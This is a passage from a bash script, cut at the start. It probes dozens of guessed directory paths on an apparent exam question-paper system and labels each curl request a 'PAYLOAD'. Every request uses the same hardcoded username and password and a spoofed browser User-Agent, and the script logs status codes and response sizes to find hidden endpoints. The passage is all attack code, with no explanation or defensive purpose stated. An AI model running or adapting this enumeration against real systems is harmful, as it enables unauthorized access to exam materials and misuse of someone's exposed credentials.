" "${target}CloudSyncQPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_Q_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_Q_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_Q_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQ_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQ_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQ_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Platform/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Platform/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Platform/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-Mgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-Mgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-Mgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_ProcessingSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_ProcessingSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_ProcessingSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Portal/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Portal/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Portal/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Management/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Management/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Management/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_DataProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_DataProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_DataProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_HandlingModule/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_HandlingModule/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_HandlingModule/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-AccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-AccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-AccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Manager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Manager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Manager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Handling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Handling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Handling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Tool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Tool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Tool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Handling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Handling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Handling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Ops/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Ops/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Ops/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQ_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQ_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQ_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_CloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_CloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_CloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminMonitoring/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminMonitoring/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminMonitoring/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileDataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileDataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileDataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_AccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_AccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_AccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Uploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Uploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Uploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_BatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_BatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_BatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoDataOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoDataOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoDataOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
